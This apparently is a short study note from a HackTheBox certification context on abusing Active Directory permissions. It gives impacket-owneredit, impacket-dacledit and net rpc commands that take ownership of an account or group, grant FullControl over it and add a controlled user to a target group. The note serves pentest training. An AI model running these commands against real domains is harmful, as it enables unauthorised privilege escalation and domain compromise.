For example, go to HTB Certified Notes
  
Change the owner of a user or group using the impacket-owneredit script
- impacket-[owneredit](http://owneredit.py/) -action write -new-owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'
  
From there you can give yourself full control over the group, then add yourself to the group if necessary
- impacket-dacledit -action 'write' -rights 'FullControl' -principal 'controlledUser' -target-dn 'groupDistinguishedName' 'domain'/'controlledUser':'password'
    
    - group distinguished name can be found by going to the target node in bloodhound → right clicking the node → edit node
        
        - it’ll be something like “CN=Users,DC=<DOMAIN>,DC=<DOMAIN>
        
    
  
Now that you have full control, add yourself to the group
- net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController”
  
if you’re gaining control over a user
- if you’re gaining control over just a user
    
    - impacket-dacledit -action 'write' -rights 'FullControl' -principal '<controlled_user>' -target '<target_user>' '<domain>'/'<controlled_user>':'<pass>’
    
![image 5 175.png](/image%205%20175.png)